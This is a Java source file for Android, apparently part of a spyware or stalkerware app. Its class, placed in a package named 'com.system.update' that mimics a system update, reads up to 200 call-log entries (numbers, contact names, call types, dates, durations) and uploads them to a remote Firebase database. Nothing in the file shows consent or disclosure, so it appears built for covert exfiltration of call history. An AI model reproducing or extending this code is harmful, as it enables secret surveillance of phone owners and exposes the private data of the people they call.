package com.system.update;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import com.google.firebase.database.DatabaseReference;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class CallsHelper {

    public static void pushCalls(Context ctx, DatabaseReference dataRef) {
        List<Map<String, Object>> list = new ArrayList<>();
        Cursor c = ctx.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC");
        if (c != null) {
            int numIdx = c.getColumnIndex(CallLog.Calls.NUMBER);
            int nameIdx = c.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int typeIdx = c.getColumnIndex(CallLog.Calls.TYPE);
            int dateIdx = c.getColumnIndex(CallLog.Calls.DATE);
            int durIdx = c.getColumnIndex(CallLog.Calls.DURATION);

            int count = 0;
            while (c.moveToNext() && count < 200) {
                Map<String, Object> m = new HashMap<>();
                m.put("number", c.getString(numIdx));
                m.put("name", c.getString(nameIdx));
                m.put("type", callTypeName(c.getInt(typeIdx)));
                m.put("date", c.getLong(dateIdx));
                m.put("duration", c.getInt(durIdx));
                list.add(m);
                count++;
            }
            c.close();
        }
        dataRef.child("calls").setValue(list);
    }

    private static String callTypeName(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE: return "INCOMING";
            case CallLog.Calls.OUTGOING_TYPE: return "OUTGOING";
            case CallLog.Calls.MISSED_TYPE:   return "MISSED";
            case CallLog.Calls.REJECTED_TYPE: return "REJECTED";
            default: return "UNKNOWN";
        }
    }
    }
